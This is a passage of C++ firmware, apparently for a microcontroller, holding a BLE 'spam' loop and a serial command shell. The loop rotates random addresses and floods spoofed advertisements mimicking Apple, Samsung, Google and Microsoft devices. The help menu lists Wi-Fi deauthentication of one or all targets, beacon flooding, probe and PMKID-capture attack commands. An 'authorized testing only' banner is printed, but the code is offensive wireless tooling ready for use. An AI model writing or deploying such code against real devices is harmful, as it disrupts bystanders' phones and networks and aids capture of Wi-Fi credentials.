  adv->setMinInterval(0x20);
  adv->setMaxInterval(0x30);
  Serial.printf("ble spam vector=%u %us; authorized testing only; send 'stop' to end\n", vector, secs);
  uint32_t sent = 0;
  uint8_t rotate = 0;
  const uint32_t start = millis();
  uint32_t lastReport = 0;
  while (!serialStop() && millis() - start < secs * 1000UL) {
    const uint8_t v = (vector == 4) ? rotate : vector;
    adv->stop();
    randomizeBleAddress();
    NimBLEAdvertisementData data;
    buildBleSpam(v, data);
    adv->setAdvertisementData(data);
    adv->start();
    sent++;
    rotate = (rotate + 1) % 4;
    if (millis() - lastReport >= 1000) {
      lastReport = millis();
      Serial.printf("  adv=%lu\n", static_cast<unsigned long>(sent));
    }
    delay(60);
  }
  adv->stop();
  Serial.printf("ble spam stopped adv=%lu\n", static_cast<unsigned long>(sent));
}

}  // namespace

bool handleLine(char* cmd) {
  char* a;
  if ((a = afterWord(cmd, "wifi")) != nullptr) {
    handleWifi(a);
    return true;
  }
  if ((a = afterWord(cmd, "ble")) != nullptr) {
    handleBle(a);
    return true;
  }
  if ((a = afterWord(cmd, "sd")) != nullptr) {
    handleSd(a);
    return true;
  }
  if (afterWord(cmd, "sensors") != nullptr) {
    handleSensors();
    return true;
  }
  if ((a = afterWord(cmd, "attack")) != nullptr) {
    handleAttack(a);
    return true;
  }
  if ((a = afterWord(cmd, "rtc")) != nullptr) {
    handleRtc(a);
    return true;
  }
  if (afterWord(cmd, "info") != nullptr) {
    cmdInfo();
    return true;
  }
  if (afterWord(cmd, "reboot") != nullptr) {
    cmdReboot();
    return true;
  }
  return false;
}

void printHelp() {
  Serial.println("wifi scan | wifi connect <ssid> [pass] | wifi status | wifi disconnect");
  Serial.println("ble scan [secs] | ble spam [apple|samsung|google|microsoft|all] [secs] | ble status");
  Serial.println("sd mount | sd ls [path] | sd cat <path> | sd df");
  Serial.println("sensors | info | reboot | rtc set <YYYY-MM-DD HH:MM:SS>");
  Serial.println("attack deauth <idx> | deauth-all | beacon | probe | pmkid <idx>   (send 'stop')");
}

}  // namespace SerialShell
